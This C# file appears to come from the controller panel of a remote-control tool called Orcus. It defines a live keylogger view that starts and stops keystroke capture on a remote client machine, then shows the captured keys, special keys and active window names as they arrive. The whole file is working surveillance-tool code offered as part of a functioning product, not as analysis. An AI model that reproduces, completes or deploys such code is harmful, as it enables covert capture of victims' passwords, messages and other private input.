using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.LiveKeylogger;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.KeyLog;
using Orcus.Shared.Commands.Keylogger;
using StandardKey = Orcus.Shared.Commands.Keylogger.StandardKey;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(7)]
    public class LiveKeyloggerViewModel : CommandView
    {
        private KeyItem _currentKeyItem;
        private bool _isEnabled;
        private LiveKeyloggerCommand _liveKeyloggerCommand;

        public override string Name { get; } = (string) Application.Current.Resources["LiveKeylogger"];
        public override Category Category { get; } = Category.Surveillance;

        public bool IsEnabled
        {
            get { return _isEnabled; }
            set
            {
                if (SetProperty(value, ref _isEnabled))
                {
                    if (value)
                        _liveKeyloggerCommand.Start();
                    else
                        _liveKeyloggerCommand.Stop();
                }
            }
        }

        public ObservableCollection<KeyItem> KeyItems { get; private set; }

        public event EventHandler ViewUpdated;

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            KeyItems = new ObservableCollection<KeyItem>();
            _currentKeyItem = new KeyItem();
            _liveKeyloggerCommand = clientController.Commander.GetCommand<LiveKeyloggerCommand>();
            _liveKeyloggerCommand.KeyDown += LiveKeyloggerCommandOnKeyUpDown;
            _liveKeyloggerCommand.KeyUp += LiveKeyloggerCommandOnKeyUpDown;
            _liveKeyloggerCommand.StringDown += LiveKeyloggerCommandOnStringDown;
            _liveKeyloggerCommand.WindowChanged += LiveKeyloggerCommandOnWindowChanged;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ToggleOfficeKeyboardScheme.ico", UriKind.Absolute));
        }

        private void LiveKeyloggerCommandOnWindowChanged(object sender, string s)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                if (_currentKeyItem != null && _currentKeyItem.InlineCollection.Count == 0)
                    _currentKeyItem.InlineCollection.Add(
                        new Italic(new Run("(" + Application.Current.Resources["NoKeyInputs"] + ")")
                        {
                            Foreground = (Brush) Application.Current.Resources["BlackBrush"]
                        }));
                _currentKeyItem = new KeyItem {ApplicationName = s, Timestamp = DateTime.Now};
                KeyItems.Add(_currentKeyItem);
                ViewUpdated?.Invoke(this, EventArgs.Empty);
            }));
        }

        private void LiveKeyloggerCommandOnStringDown(object sender, string s)
        {
            if (_currentKeyItem != null && !string.IsNullOrEmpty(s))
                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                {
                    _currentKeyItem.InlineCollection.Add(s);
                    ViewUpdated?.Invoke(this, EventArgs.Empty);
                }));
        }

        private void LiveKeyloggerCommandOnKeyUpDown(object sender, KeyLogEntry keyLogEntry)
        {
            if (_currentKeyItem != null)
                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                {
                    var specialKey = keyLogEntry as SpecialKey;
                    if (specialKey != null)
                    {
                        AddSpecialKey(specialKey);
                        Debug.Print(specialKey.KeyType + "   " + specialKey.IsDown);
                        return;
                    }

                    var standardKey = keyLogEntry as StandardKey;
                    if (standardKey != null)
                    {
                        AddStandardKey(standardKey);
                    }

                    ViewUpdated?.Invoke(this, EventArgs.Empty);
                }));
        }

        private void AddStandardKey(StandardKey standardKey)
        {
            string text;
            switch (standardKey.Key)
            {
                case Keys.Alt:
                    text = "Alt";
                    break;
                case Keys.RMenu:
                    text = "Alt Gr";
                    break;
                case Keys.Delete:
                    text = "Del";
                    break;
                case Keys.Control:
                case Keys.LControlKey:
                    text = "Ctrl";
                    break;
                default:
                    text = standardKey.ToString();
                    break;
            }
            _currentKeyItem.InlineCollection.Add(new KeyLog.StandardKey(text)
            {
                IsPressed = standardKey.IsDown
            });
        }

        private void AddSpecialKey(SpecialKey specialKey)
        {
            KeyControl key;
            switch (specialKey.KeyType)
            {
                case SpecialKeyType.Shift:
                    key = new ShiftKey();
                    break;
                case SpecialKeyType.Win:
                    key = new WindowsKey();
                    break;
                case SpecialKeyType.Tab:
                    key = new TabKey();
                    break;
                case SpecialKeyType.Captial:
                    key = new CapsKey();
                    break;
                case SpecialKeyType.Return:
                    key = new EnterKey();
                    break;
                case SpecialKeyType.Back:
                    key = new BackKey();
                    break;
                default:
                    return;
            }
            key.IsPressed = specialKey.IsDown;
            _currentKeyItem.InlineCollection.Add(key);
        }
    }
}